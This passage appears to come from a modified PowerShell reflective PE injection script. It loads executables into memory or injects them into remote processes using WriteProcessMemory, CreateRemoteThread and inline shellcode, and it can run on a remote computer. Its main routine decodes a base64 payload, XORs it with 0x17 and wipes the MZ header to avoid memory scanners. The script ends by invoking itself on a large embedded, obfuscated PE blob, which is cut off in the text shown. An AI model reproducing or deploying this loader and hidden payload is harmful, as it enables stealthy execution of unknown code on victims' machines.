		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	[Byte[]]$PEBytes1 = [System.Convert]::FromBase64String($PEBytes)
	for ($i = 0; $i -lt $PEBytes1.Count; $i++)
	{
		$PEBytes1[$i]=$PEBytes1[$i] -bXOR 0x17
	}
	$PEBytes=$PEBytes1
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    # Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
	# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
    $PEBytes[0] = 0
    $PEBytes[1] = 0
	
	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main

}
Invoke-ReflectivePEInjection -PEBytes "Wk2HFxQXFxcTFxcX6OgXF68XFxcXFxcXVxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX/xcXFxkIrRkXox7aNq8WW9o2Q39+ZDdnZXhwZXZ6N3R2eXl4Yzd1cjdlYnk3fnk3U1hEN3p4c3I5GhodMxcXFxcXFxeYgLMM3OHdX9zh3V/c4d1fT69FX93h3V/HfENfzOHdX8d8d1+s4d1f1ZlOX9Xh3V/c4dxfvOHdX8d8dl/34d1fx3xAX93h3V9FfnR/3OHdXxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF0dSFxdbFhMXVmtaTRcXFxcXFxcX9xcVFhwWHRcX6xcXF5MXFxcXFxfgYhcXFwcXFxcHFhcXF1cXFwcXFxcVFxcSFxYXFxcXFxIXFhcXFxcXF6cWFxcTFxcXFxcXFRdXlhcXBxcXBxcXFxcHFxcHFxcXFxcXBxcXFxcXFxcXFxcXe1YWF3MXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXhxYXUxoXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXPyMWF1cXFxcXFxcXFxcXFxcHFhd/FhcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXOWNyb2MXFxdl7BcXFwcXFxfrFxcXExcXFxcXFxcXFxcXFxcXNxcXdzllc3ZjdhcXnS4XFxcHFhcXLRcXFxcWFxcXFxcXFxcXFxcXF1cXF1c5c3ZjdhcXF5MnFxcXRxYXFwUXFxctFhcXFxcXFxcXFxcXFxdXFxfXOWVye3h0FxfdABcXF4cWFxcPFxcXWxYXFxcXFxcXFxcXFxcXVxcXVRcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX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